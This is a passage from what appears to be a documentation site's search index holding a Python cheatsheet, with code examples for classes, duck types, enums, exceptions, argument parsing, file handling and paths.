however manually check if the argument they received is a function and act accordingly.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#class","title":"Class","text":"<pre><code>class &lt;name&gt;:\n    def __init__(self, a):\n        self.a = a\n    def __repr__(self):\n        class_name = self.__class__.__name__\n        return f'{class_name}({self.a!r})'\n    def __str__(self):\n        return str(self.a)\n\n    @classmethod\n    def get_class_name(cls):\n        return cls.__name__\n</code></pre> <ul> <li>Return value of repr() should be unambiguous and of str() readable.</li> <li>If only repr() is defined, it will also be used for str().</li> <li>Methods decorated with <code>'@staticmethod'</code> do not receive 'self' nor 'cls' as their first arg.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#str-use-cases","title":"Str() use cases:","text":"<pre><code>print(&lt;el&gt;)\nf'{&lt;el&gt;}'\nlogging.warning(&lt;el&gt;)\ncsv.writer(&lt;file&gt;).writerow([&lt;el&gt;])\nraise Exception(&lt;el&gt;)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#repr-use-cases","title":"Repr() use cases:","text":"<pre><code>print/str/repr([&lt;el&gt;])\nf'{&lt;el&gt;!r}'\nZ = dataclasses.make_dataclass('Z', ['a']); print/str/repr(Z(&lt;el&gt;))\n&gt;&gt;&gt; &lt;el&gt;\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#constructor-overloading","title":"Constructor Overloading","text":"<pre><code>class &lt;name&gt;:\n    def __init__(self, a=None):\n        self.a = a\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#inheritance","title":"Inheritance","text":"<pre><code>class Person:\n    def __init__(self, name, age):\n        self.name = name\n        self.age  = age\n\nclass Employee(Person):\n    def __init__(self, name, age, staff_num):\n        super().__init__(name, age)\n        self.staff_num = staff_num\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#multiple-inheritance","title":"Multiple Inheritance","text":"<pre><code>class A: pass\nclass B: pass\nclass C(A, B): pass\n</code></pre> <p>MRO determines the order in which parent classes are traversed when searching for a method or an attribute:</p> <pre><code>&gt;&gt;&gt; C.mro()\n[&lt;class 'C'&gt;, &lt;class 'A'&gt;, &lt;class 'B'&gt;, &lt;class 'object'&gt;]\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#property","title":"Property","text":"<p>Pythonic way of implementing getters and setters.</p> <pre><code>class Person:\n    @property\n    def name(self):\n        return ' '.join(self._name)\n\n    @name.setter\n    def name(self, value):\n        self._name = value.split()\n</code></pre> <pre><code>&gt;&gt;&gt; person = Person()\n&gt;&gt;&gt; person.name = '\\t Guido  van Rossum \\n'\n&gt;&gt;&gt; person.name\n'Guido van Rossum'\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#dataclass","title":"Dataclass","text":"<p>Decorator that automatically generates init(), repr() and eq() special methods.</p> <pre><code>from dataclasses import dataclass, field\n\n@dataclass(order=False, frozen=False)\nclass &lt;class_name&gt;:\n    &lt;attr_name_1&gt;: &lt;type&gt;\n    &lt;attr_name_2&gt;: &lt;type&gt; = &lt;default_value&gt;\n    &lt;attr_name_3&gt;: list/dict/set = field(default_factory=list/dict/set)\n</code></pre> <ul> <li>Objects can be made sortable with <code>'order=True'</code> and immutable with <code>'frozen=True'</code>.</li> <li>For object to be hashable, all attributes must be hashable and 'frozen' must be True.</li> <li>Function field() is needed because <code>'&lt;attr_name&gt;: list = []'</code> would make a list that is shared among all instances. Its 'default_factory' argument can be any callable.</li> <li>For attributes of arbitrary type use <code>'typing.Any'</code>.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#inline_1","title":"Inline:","text":"<pre><code>from dataclasses import make_dataclass\n&lt;class&gt; = make_dataclass('&lt;class_name&gt;', &lt;coll_of_attribute_names&gt;)\n&lt;class&gt; = make_dataclass('&lt;class_name&gt;', &lt;coll_of_tuples&gt;)\n&lt;tuple&gt; = ('&lt;attr_name&gt;', &lt;type&gt; [, &lt;default_value&gt;])\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#rest-of-type-annotations-cpython-interpreter-ignores-them-all","title":"Rest of type annotations (CPython interpreter ignores them all):","text":"<pre><code>def func(&lt;arg_name&gt;: &lt;type&gt; [= &lt;obj&gt;]) -&gt; &lt;type&gt;: ...\n&lt;var_name&gt;: typing.List/Set/Iterable/Sequence/Optional[&lt;type&gt;]\n&lt;var_name&gt;: typing.Dict/Tuple/Union[&lt;type&gt;, ...]\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#slots","title":"Slots","text":"<p>Mechanism that restricts objects to attributes listed in 'slots' and significantly reduces their memory footprint.</p> <pre><code>class MyClassWithSlots:\n    __slots__ = ['a']\n    def __init__(self):\n        self.a = 1\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#copy","title":"Copy","text":"<pre><code>from copy import copy, deepcopy\n&lt;object&gt; = copy(&lt;object&gt;)\n&lt;object&gt; = deepcopy(&lt;object&gt;)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#duck-types","title":"Duck Types","text":"<p>A duck type is an implicit type that prescribes a set of special methods. Any object that has those methods defined is considered a member of that duck type.</p>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#comparable","title":"Comparable","text":"<ul> <li>If eq() method is not overridden, it returns <code>'id(self) == id(other)'</code>, which is the same as <code>'self is other'</code>.</li> <li>That means all objects compare not equal by default.</li> <li>Only the left side object has eq() method called, unless it returns NotImplemented, in which case the right object is consulted. False is returned if both return NotImplemented.</li> <li>Ne() automatically works on any object that has eq() defined.</li> </ul> <pre><code>class MyComparable:\n    def __init__(self, a):\n        self.a = a\n    def __eq__(self, other):\n        if isinstance(other, type(self)):\n            return self.a == other.a\n        return NotImplemented\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#hashable","title":"Hashable","text":"<ul> <li>Hashable object needs both hash() and eq() methods and its hash value should never change.</li> <li>Hashable objects that compare equal must have the same hash value, meaning default hash() that returns <code>'id(self)'</code> will not do.</li> <li>That is why Python automatically makes classes unhashable if you only implement eq().</li> </ul> <pre><code>class MyHashable:\n    def __init__(self, a):\n        self._a = a\n    @property\n    def a(self):\n        return self._a\n    def __eq__(self, other):\n        if isinstance(other, type(self)):\n            return self.a == other.a\n        return NotImplemented\n    def __hash__(self):\n        return hash(self.a)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#sortable","title":"Sortable","text":"<ul> <li>With 'total_ordering' decorator, you only need to provide eq() and one of lt(), gt(), le() or ge() special methods and the rest will be automatically generated.</li> <li>Functions sorted() and min() only require lt() method, while max() only requires gt(). However, it is best to define them all so that confusion doesn't arise in other contexts.</li> <li>When two lists, strings or dataclasses are compared, their values get compared in order until a pair of unequal values is found. The comparison of this two values is then returned. The shorter sequence is considered smaller in case of all values being equal.</li> </ul> <pre><code>from functools import total_ordering\n\n@total_ordering\nclass MySortable:\n    def __init__(self, a):\n        self.a = a\n    def __eq__(self, other):\n        if isinstance(other, type(self)):\n            return self.a == other.a\n        return NotImplemented\n    def __lt__(self, other):\n        if isinstance(other, type(self)):\n            return self.a &lt; other.a\n        return NotImplemented\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#iterator_1","title":"Iterator","text":"<ul> <li>Any object that has methods next() and iter() is an iterator.</li> <li>Next() should return next item or raise StopIteration.</li> <li>Iter() should return 'self'.</li> </ul> <pre><code>class Counter:\n    def __init__(self):\n        self.i = 0\n    def __next__(self):\n        self.i += 1\n        return self.i\n    def __iter__(self):\n        return self\n</code></pre> <pre><code>&gt;&gt;&gt; counter = Counter()\n&gt;&gt;&gt; next(counter), next(counter), next(counter)\n(1, 2, 3)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#python-has-many-different-iterator-objects","title":"Python has many different iterator objects:","text":"<ul> <li>Sequence iterators returned by the iter() function, such as list_iterator and set_iterator.</li> <li>Objects returned by the itertools module, such as count, repeat and cycle.</li> <li>Generators returned by the generator functions and generator expressions.</li> <li>File objects returned by the open() function, etc.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#callable","title":"Callable","text":"<ul> <li>All functions and classes have a call() method, hence are callable.</li> <li>When this cheatsheet uses <code>'&lt;function&gt;'</code> as an argument, it actually means <code>'&lt;callable&gt;'</code>.</li> </ul> <pre><code>class Counter:\n    def __init__(self):\n        self.i = 0\n    def __call__(self):\n        self.i += 1\n        return self.i\n</code></pre> <pre><code>&gt;&gt;&gt; counter = Counter()\n&gt;&gt;&gt; counter(), counter(), counter()\n(1, 2, 3)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#context-manager","title":"Context Manager","text":"<ul> <li>Enter() should lock the resources and optionally return an object.</li> <li>Exit() should release the resources.</li> <li>Any exception that happens inside the with block is passed to the exit() method.</li> <li>If it wishes to suppress the exception it must return a true value.</li> </ul> <pre><code>class MyOpen:\n    def __init__(self, filename):\n        self.filename = filename\n    def __enter__(self):\n        self.file = open(self.filename)\n        return self.file\n    def __exit__(self, exc_type, exception, traceback):\n        self.file.close()\n</code></pre> <pre><code>&gt;&gt;&gt; with open('test.txt', 'w') as file:\n...     file.write('Hello World!')\n&gt;&gt;&gt; with MyOpen('test.txt') as file:\n...     print(file.read())\nHello World!\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#iterable-duck-types","title":"Iterable Duck Types","text":""},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#iterable","title":"Iterable","text":"<ul> <li>Only required method is iter(). It should return an iterator of object's items.</li> <li>Contains() automatically works on any object that has iter() defined.</li> </ul> <pre><code>class MyIterable:\n    def __init__(self, a):\n        self.a = a\n    def __iter__(self):\n        return iter(self.a)\n    def __contains__(self, el):\n        return el in self.a\n</code></pre> <pre><code>&gt;&gt;&gt; obj = MyIterable([1, 2, 3])\n&gt;&gt;&gt; [el for el in obj]\n[1, 2, 3]\n&gt;&gt;&gt; 1 in obj\nTrue\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#collection","title":"Collection","text":"<ul> <li>Only required methods are iter() and len().</li> <li>This cheatsheet actually means <code>'&lt;iterable&gt;'</code> when it uses <code>'&lt;collection&gt;'</code>.</li> <li>I chose not to use the name 'iterable' because it sounds scarier and more vague than 'collection'. The only drawback of this decision is that a reader could think a certain function doesn't accept iterators when it does, since iterators are the only built-in objects that are iterable but are not collections.</li> </ul> <pre><code>class MyCollection:\n    def __init__(self, a):\n        self.a = a\n    def __iter__(self):\n        return iter(self.a)\n    def __contains__(self, el):\n        return el in self.a\n    def __len__(self):\n        return len(self.a)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#sequence","title":"Sequence","text":"<ul> <li>Only required methods are len() and getitem().</li> <li>Getitem() should return an item at the passed index or raise IndexError.</li> <li>Iter() and contains() automatically work on any object that has getitem() defined.</li> <li>Reversed() automatically works on any object that has len() and getitem() defined.</li> </ul> <pre><code>class MySequence:\n    def __init__(self, a):\n        self.a = a\n    def __iter__(self):\n        return iter(self.a)\n    def __contains__(self, el):\n        return el in self.a\n    def __len__(self):\n        return len(self.a)\n    def __getitem__(self, i):\n        return self.a[i]\n    def __reversed__(self):\n        return reversed(self.a)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#discrepancies-between-glossary-definitions-and-abstract-base-classes","title":"Discrepancies between glossary definitions and abstract base classes:","text":"<ul> <li>Glossary defines iterable as any object with iter() or getitem() and sequence as any object with len() and getitem(). It does not define collection.</li> <li>Passing ABC Iterable to isinstance() or issubclass() checks whether object/class has method iter(), while ABC Collection checks for iter(), contains() and len().</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#abc-sequence","title":"ABC Sequence","text":"<ul> <li>It's a richer interface than the basic sequence.</li> <li>Extending it generates iter(), contains(), reversed(), index() and count().</li> <li>Unlike <code>'abc.Iterable'</code> and <code>'abc.Collection'</code>, it is not a duck type. That is why <code>'issubclass(MySequence, abc.Sequence)'</code> would return False even if MySequence had all the methods defined. It however recognizes list, tuple, range, str, bytes, bytearray, memoryview and deque, because they are registered as Sequence's virtual subclasses.</li> </ul> <pre><code>from collections import abc\n\nclass MyAbcSequence(abc.Sequence):\n    def __init__(self, a):\n        self.a = a\n    def __len__(self):\n        return len(self.a)\n    def __getitem__(self, i):\n        return self.a[i]\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#table-of-required-and-automatically-available-special-methods","title":"Table of required and automatically available special methods:","text":"<pre><code>+------------+------------+------------+------------+--------------+\n|            |  Iterable  | Collection |  Sequence  | abc.Sequence |\n+------------+------------+------------+------------+--------------+\n| iter()     |    REQ     |    REQ     |    Yes     |     Yes      |\n| contains() |    Yes     |    Yes     |    Yes     |     Yes      |\n| len()      |            |    REQ     |    REQ     |     REQ      |\n| getitem()  |            |            |    REQ     |     REQ      |\n| reversed() |            |            |    Yes     |     Yes      |\n| index()    |            |            |            |     Yes      |\n| count()    |            |            |            |     Yes      |\n+------------+------------+------------+------------+--------------+\n</code></pre> <ul> <li>Other ABCs that generate missing methods are: MutableSequence, Set, MutableSet, Mapping and MutableMapping.</li> <li>Names of their required methods are stored in <code>'&lt;abc&gt;.__abstractmethods__'</code>.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#enum","title":"Enum","text":"<pre><code>from enum import Enum, auto\n</code></pre> <pre><code>class &lt;enum_name&gt;(Enum):\n    &lt;member_name_1&gt; = &lt;value_1&gt;\n    &lt;member_name_2&gt; = &lt;value_2_a&gt;, &lt;value_2_b&gt;\n    &lt;member_name_3&gt; = auto()\n</code></pre> <ul> <li>If there are no numeric values before auto(), it returns 1.</li> <li>Otherwise it returns an increment of the last numeric value.</li> </ul> <pre><code>&lt;member&gt; = &lt;enum&gt;.&lt;member_name&gt;                 # Returns a member.\n&lt;member&gt; = &lt;enum&gt;['&lt;member_name&gt;']              # Returns a member or raises KeyError.\n&lt;member&gt; = &lt;enum&gt;(&lt;value&gt;)                      # Returns a member or raises ValueError.\n&lt;str&gt;    = &lt;member&gt;.name                        # Returns member's name.\n&lt;obj&gt;    = &lt;member&gt;.value                       # Returns member's value.\n</code></pre> <pre><code>list_of_members = list(&lt;enum&gt;)\nmember_names    = [a.name for a in &lt;enum&gt;]\nmember_values   = [a.value for a in &lt;enum&gt;]\nrandom_member   = random.choice(list(&lt;enum&gt;))\n</code></pre> <pre><code>def get_next_member(member):\n    members = list(member.__class__)\n    index   = (members.index(member) + 1) % len(members)\n    return members[index]\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#inline_2","title":"Inline","text":"<pre><code>Cutlery = Enum('Cutlery', 'fork knife spoon')\nCutlery = Enum('Cutlery', ['fork', 'knife', 'spoon'])\nCutlery = Enum('Cutlery', {'fork': 1, 'knife': 2, 'spoon': 3})\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#user-defined-functions-cannot-be-values-so-they-must-be-wrapped","title":"User-defined functions cannot be values, so they must be wrapped:","text":"<pre><code>from functools import partial\nLogicOp = Enum('LogicOp', {'AND': partial(lambda l, r: l and r),\n                           'OR':  partial(lambda l, r: l or r)})\n</code></pre> <ul> <li>Member names are in all caps because trying to access a member that is named after a reserved keyword raises SyntaxError.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#exceptions","title":"Exceptions","text":""},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#basic-example","title":"Basic Example","text":"<pre><code>try:\n    &lt;code&gt;\nexcept &lt;exception&gt;:\n    &lt;code&gt;\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#complex-example","title":"Complex Example","text":"<pre><code>try:\n    &lt;code_1&gt;\nexcept &lt;exception_a&gt;:\n    &lt;code_2_a&gt;\nexcept &lt;exception_b&gt;:\n    &lt;code_2_b&gt;\nelse:\n    &lt;code_2_c&gt;\nfinally:\n    &lt;code_3&gt;\n</code></pre> <ul> <li>Code inside the <code>'else'</code> block will only be executed if <code>'try'</code> block had no exceptions.</li> <li>Code inside the <code>'finally'</code> block will always be executed (unless a signal is received).</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#catching-exceptions","title":"Catching Exceptions","text":"<pre><code>except &lt;exception&gt;:\nexcept &lt;exception&gt; as &lt;name&gt;:\nexcept (&lt;exception&gt;, [...]):\nexcept (&lt;exception&gt;, [...]) as &lt;name&gt;:\n</code></pre> <ul> <li>Also catches subclasses of the exception.</li> <li>Use <code>'traceback.print_exc()'</code> to print the error message to stderr.</li> <li>Use <code>'print(&lt;name&gt;)'</code> to print just the cause of the exception (its arguments).</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#raising-exceptions","title":"Raising Exceptions","text":"<pre><code>raise &lt;exception&gt;\nraise &lt;exception&gt;()\nraise &lt;exception&gt;(&lt;el&gt; [, ...])\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#re-raising-caught-exception","title":"Re-raising caught exception:","text":"<pre><code>except &lt;exception&gt; as &lt;name&gt;:\n    ...\n    raise\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#exception-object","title":"Exception Object","text":"<pre><code>arguments = &lt;name&gt;.args\nexc_type  = &lt;name&gt;.__class__\nfilename  = &lt;name&gt;.__traceback__.tb_frame.f_code.co_filename\nfunc_name = &lt;name&gt;.__traceback__.tb_frame.f_code.co_name\nline      = linecache.getline(filename, &lt;name&gt;.__traceback__.tb_lineno)\ntraceback = ''.join(traceback.format_tb(&lt;name&gt;.__traceback__))\nerror_msg = ''.join(traceback.format_exception(exc_type, &lt;name&gt;, &lt;name&gt;.__traceback__))\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#built-in-exceptions","title":"Built-in Exceptions","text":"<pre><code>BaseException\n +-- SystemExit                   # Raised by the sys.exit() function.\n +-- KeyboardInterrupt            # Raised when the user hits the interrupt key (ctrl-c).\n +-- Exception                    # User-defined exceptions should be derived from this class.\n      +-- ArithmeticError         # Base class for arithmetic errors.\n      |    +-- ZeroDivisionError  # Raised when dividing by zero.\n      +-- AssertionError          # Raised by `assert &lt;exp&gt;` if expression returns false value.\n      +-- AttributeError          # Raised when an attribute is missing.\n      +-- EOFError                # Raised by input() when it hits end-of-file condition.\n      +-- LookupError             # Raised when a look-up on a collection fails.\n      |    +-- IndexError         # Raised when a sequence index is out of range.\n      |    +-- KeyError           # Raised when a dictionary key or set element is missing.\n      +-- MemoryError             # Out of memory. Could be too late to start deleting vars.\n      +-- NameError               # Raised when an object is missing.\n      +-- OSError                 # Errors such as \u201cfile not found\u201d or \u201cdisk full\u201d (see Open).\n      |    +-- FileNotFoundError  # When a file or directory is requested but doesn't exist.\n      +-- RuntimeError            # Raised by errors that don't fall into other categories.\n      |    +-- RecursionError     # Raised when the maximum recursion depth is exceeded.\n      +-- StopIteration           # Raised by next() when run on an empty iterator.\n      +-- TypeError               # Raised when an argument is of wrong type.\n      +-- ValueError              # When an argument is of right type but inappropriate value.\n           +-- UnicodeError       # Raised when encoding/decoding strings to/from bytes fails.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#collections-and-their-exceptions","title":"Collections and their exceptions:","text":"<pre><code>+-----------+------------+------------+------------+\n|           |    List    |    Set     |    Dict    |\n+-----------+------------+------------+------------+\n| getitem() | IndexError |            |  KeyError  |\n| pop()     | IndexError |  KeyError  |  KeyError  |\n| remove()  | ValueError |  KeyError  |            |\n| index()   | ValueError |            |            |\n+-----------+------------+------------+------------+\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#useful-built-in-exceptions","title":"Useful built-in exceptions:","text":"<pre><code>raise TypeError('Argument is of wrong type!')\nraise ValueError('Argument is of right type but inappropriate value!')\nraise RuntimeError('None of above!')\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#user-defined-exceptions","title":"User-defined Exceptions","text":"<pre><code>class MyError(Exception): pass\nclass MyInputError(MyError): pass\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#exit","title":"Exit","text":"<p>Exits the interpreter by raising SystemExit exception.</p> <pre><code>import sys\nsys.exit()                        # Exits with exit code 0 (success).\nsys.exit(&lt;el&gt;)                    # Prints to stderr and exits with 1.\nsys.exit(&lt;int&gt;)                   # Exits with passed exit code.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#print","title":"Print","text":"<pre><code>print(&lt;el_1&gt;, ..., sep=' ', end='\\n', file=sys.stdout, flush=False)\n</code></pre> <ul> <li>Use <code>'file=sys.stderr'</code> for messages about errors.</li> <li>Use <code>'flush=True'</code> to forcibly flush the stream.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#pretty-print","title":"Pretty Print","text":"<pre><code>from pprint import pprint\npprint(&lt;collection&gt;, width=80, depth=None, compact=False, sort_dicts=True)\n</code></pre> <ul> <li>Levels deeper than 'depth' get replaced by '...'.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#input","title":"Input","text":"<p>Reads a line from user input or pipe if present.</p> <pre><code>&lt;str&gt; = input(prompt=None)\n</code></pre> <ul> <li>Trailing newline gets stripped.</li> <li>Prompt string is printed to the standard output before reading input.</li> <li>Raises EOFError when user hits EOF (ctrl-d/ctrl-z\u23ce) or input stream gets exhausted.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#command-line-arguments","title":"Command Line Arguments","text":"<pre><code>import sys\nscripts_path = sys.argv[0]\narguments    = sys.argv[1:]\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#argument-parser","title":"Argument Parser","text":"<pre><code>from argparse import ArgumentParser, FileType\np = ArgumentParser(description=&lt;str&gt;)\np.add_argument('-&lt;short_name&gt;', '--&lt;name&gt;', action='store_true')  # Flag.\np.add_argument('-&lt;short_name&gt;', '--&lt;name&gt;', type=&lt;type&gt;)          # Option.\np.add_argument('&lt;name&gt;', type=&lt;type&gt;, nargs=1)                    # First argument.\np.add_argument('&lt;name&gt;', type=&lt;type&gt;, nargs='+')                  # Remaining arguments.\np.add_argument('&lt;name&gt;', type=&lt;type&gt;, nargs='*')                  # Optional arguments.\nargs  = p.parse_args()                                            # Exits on error.\nvalue = args.&lt;name&gt;\n</code></pre> <ul> <li>Use <code>'help=&lt;str&gt;'</code> to set argument description that will be displayed in help message.</li> <li>Use <code>'default=&lt;el&gt;'</code> to set the default value.</li> <li>Use <code>'type=FileType(&lt;mode&gt;)'</code> for files. Accepts 'encoding', but not 'newline'.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#open","title":"Open","text":"<p>Opens the file and returns a corresponding file object.</p> <pre><code>&lt;file&gt; = open(&lt;path&gt;, mode='r', encoding=None, newline=None)\n</code></pre> <ul> <li><code>'encoding=None'</code> means that the default encoding is used, which is platform dependent. Best practice is to use <code>'encoding=\"utf-8\"'</code> whenever possible.</li> <li><code>'newline=None'</code> means all different end of line combinations are converted to '\\n' on read, while on write all '\\n' characters are converted to system's default line separator.</li> <li><code>'newline=\"\"'</code> means no conversions take place, but input is still broken into chunks by readline() and readlines() on every '\\n', '\\r' and '\\r\\n'.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#modes","title":"Modes","text":"<ul> <li><code>'r'</code>  - Read (default).</li> <li><code>'w'</code>  - Write (truncate).</li> <li><code>'x'</code>  - Write or fail if the file already exists.</li> <li><code>'a'</code>  - Append.</li> <li><code>'w+'</code> - Read and write (truncate).</li> <li><code>'r+'</code> - Read and write from the start.</li> <li><code>'a+'</code> - Read and write from the end.</li> <li><code>'t'</code>  - Text mode (default).</li> <li><code>'b'</code>  - Binary mode (<code>'br'</code>, <code>'bw'</code>, <code>'bx'</code>, \u2026).</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#exceptions_1","title":"Exceptions","text":"<ul> <li><code>'FileNotFoundError'</code> can be raised when reading with <code>'r'</code> or <code>'r+'</code>.</li> <li><code>'FileExistsError'</code> can be raised when writing with <code>'x'</code>.</li> <li><code>'IsADirectoryError'</code> and <code>'PermissionError'</code> can be raised by any.</li> <li><code>'OSError'</code> is the parent class of all listed exceptions.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#file-object","title":"File Object","text":"<pre><code>&lt;file&gt;.seek(0)                      # Moves to the start of the file.\n&lt;file&gt;.seek(offset)                 # Moves 'offset' chars/bytes from the start.\n&lt;file&gt;.seek(0, 2)                   # Moves to the end of the file.\n&lt;bin_file&gt;.seek(\u00b1offset, &lt;anchor&gt;)  # Anchor: 0 start, 1 current position, 2 end.\n</code></pre> <pre><code>&lt;str/bytes&gt; = &lt;file&gt;.read(size=-1)  # Reads 'size' chars/bytes or until EOF.\n&lt;str/bytes&gt; = &lt;file&gt;.readline()     # Returns a line or empty string/bytes on EOF.\n&lt;list&gt;      = &lt;file&gt;.readlines()    # Returns a list of remaining lines.\n&lt;str/bytes&gt; = next(&lt;file&gt;)          # Returns a line using buffer. Do not mix.\n</code></pre> <pre><code>&lt;file&gt;.write(&lt;str/bytes&gt;)           # Writes a string or bytes object.\n&lt;file&gt;.writelines(&lt;collection&gt;)     # Writes a coll. of strings or bytes objects.\n&lt;file&gt;.flush()                      # Flushes write buffer. Runs every 4096/8192 B.\n</code></pre> <ul> <li>Methods do not add or strip trailing newlines, even writelines().</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#read-text-from-file","title":"Read Text from File","text":"<pre><code>def read_file(filename):\n    with open(filename, encoding='utf-8') as file:\n        return file.readlines()\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#write-text-to-file","title":"Write Text to File","text":"<pre><code>def write_to_file(filename, text):\n    with open(filename, 'w', encoding='utf-8') as file:\n        file.write(text)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#paths","title":"Paths","text":"<pre><code>from os import getcwd, path, listdir, scandir\nfrom glob import glob\n</code></pre> <pre><code>&lt;str&gt;  = getcwd()                   # Returns the current working directory.\n&lt;str&gt;  = path.join(&lt;path&gt;, ...)     # Joins two or more pathname components.\n&lt;str&gt;  = path.abspath(&lt;path&gt;)       # Returns absolute path.\n</code></pre> <pre><code>&lt;str&gt;  = path.basename(&lt;path&gt;)      # Returns final component of the path.\n&lt;str&gt;  = path.dirname(&lt;path&gt;)       # Returns path without the final component.\n&lt;tup.&gt; = path.splitext(&lt;path&gt;)      # Splits on last period of the final component.\n</code></pre> <pre><code>&lt;list&gt; = listdir(path='.')          # Returns filenames located at path.\n&lt;list&gt; = glob('&lt;pattern&gt;')          # Returns paths matching the wildcard pattern.\n</code></pre> <pre><code>&lt;bool&gt; = path.exists(&lt;path&gt;)        # Or: &lt;Path&gt;.exists()\n&lt;bool&gt; = path.isfile(&lt;path&gt;)        # Or: &lt;DirEntry/Path&gt;.is_file()\n&lt;bool&gt; = path.isdir(&lt;path&gt;)         # Or: &lt;DirEntry/Path&gt;.is_dir()\n</code></pre> <pre><code>&lt;stat&gt; = os.stat(&lt;path&gt;)            # Or: &lt;DirEntry/Path&gt;.stat()\n&lt;real&gt; = &lt;stat&gt;.st_mtime/st_size/\u2026  # Modification time, size in bytes, \u2026\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#direntry","title":"DirEntry","text":"<p>Unlike listdir(), scandir() returns DirEntry objects that cache isfile, isdir and on Windows also stat information, thus significantly increasing the performance of code that requires it.</p> <pre><code>&lt;iter&gt; = scandir(path='.')          # Returns DirEntry objects located at path.\n&lt;str&gt;  = &lt;DirEntry&gt;.path            # Returns whole path as a string.\n&lt;str&gt;  = &lt;DirEntry&gt;.name            # Returns final component as a string.\n&lt;file&gt; = open(&lt;DirEntry&gt;)           # Opens the file and returns a file object.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#path-object","title":"Path Object","text":"<pre><code>from pathlib import Path\n</code></pre> <pre><code>&lt;Path&gt; = Path(&lt;path&gt; [, ...])       # Accepts strings, Paths and DirEntry objects.\n&lt;Path&gt; = &lt;path&gt; / &lt;path&gt; [/ ...]    # First or second path must be a Path object.\n</code></pre> <pre><code>&lt;Path&gt; = Path()                     # Returns relative cwd. Also Path('.').\n&lt;Path&gt; = Path.cwd()                 # Returns absolute cwd. Also Path().resolve().\n&lt;Path&gt; = Path.home()                # Returns user's home directory (absolute).\n&lt;Path&gt; = Path(__file__).resolve()   # Returns script's path if cwd wasn't changed.\n</code></pre> <pre><code>&lt;Path&gt; = &lt;Path&gt;.parent              # Returns Path without the final component.\n&lt;str&gt;  = &lt;Path&gt;.name                # Returns final component as a string.\n&lt;str&gt;  = &lt;Path&gt;.stem                # Returns final component without extension.\n&lt;str&gt;  = &lt;Path&gt;.suffix              # Returns final component's extension.\n&lt;tup.&gt; = &lt;Path&gt;.parts               # Returns all components as strings.\n</code></pre> <pre><code>&lt;iter&gt; = &lt;Path&gt;.iterdir()           # Returns directory contents as Path objects.\n&lt;iter&gt; = &lt;Path&gt;.glob('&lt;pattern&gt;')   # Returns Paths matching the wildcard 